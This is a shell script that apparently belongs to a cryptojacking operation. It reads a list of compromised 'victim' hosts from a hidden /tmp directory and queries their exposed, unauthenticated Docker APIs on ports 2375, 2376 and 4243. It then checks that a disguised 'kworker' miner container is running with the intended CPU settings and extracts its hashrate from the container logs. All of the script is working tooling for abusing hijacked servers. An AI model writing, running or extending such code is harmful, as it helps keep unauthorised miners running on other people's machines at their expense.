#!/bin/sh
# Verify the upgrade rollout: are victims being re-created, and with what settings?
cd /tmp/.sysd/.hunt || exit 1
echo "recreate_lines_20min=$(journalctl -u kworker-dock --since '-20 min' --no-pager 2>/dev/null | grep -c 're-creating')"
for ip in $(cut -f1 dock.owned | sort -u | head -4); do
  for p in 2375 2376 4243; do
    case $p in 2376) s=https; o=-k;; *) s=http; o="";; esac
    v=$(curl -fsS $o -m 3 "$s://$ip:$p/version" 2>/dev/null) || continue
    case "$v" in *ApiVersion*) ;; *) continue;; esac
    j=$(curl -fsS $o -m 6 "$s://$ip:$p/containers/kworker/json" 2>/dev/null)
    echo "$ip  cpucores=$(printf '%s' "$j" | grep -o '"CpuShares":[0-9]*' | head -1 | cut -d: -f2)  hint_in_cmd=$(printf '%s' "$j" | grep -c 'cpu-max-threads-hint')"
    curl -fsS $o -m 8 "$s://$ip:$p/containers/kworker/logs?stdout=1&stderr=1&tail=150" 2>/dev/null \
        | tr -d '\000' | grep -o 'speed 10s/60s/15m[^m]*' | tail -1 | sed 's/^/     /'
    break
  done
done
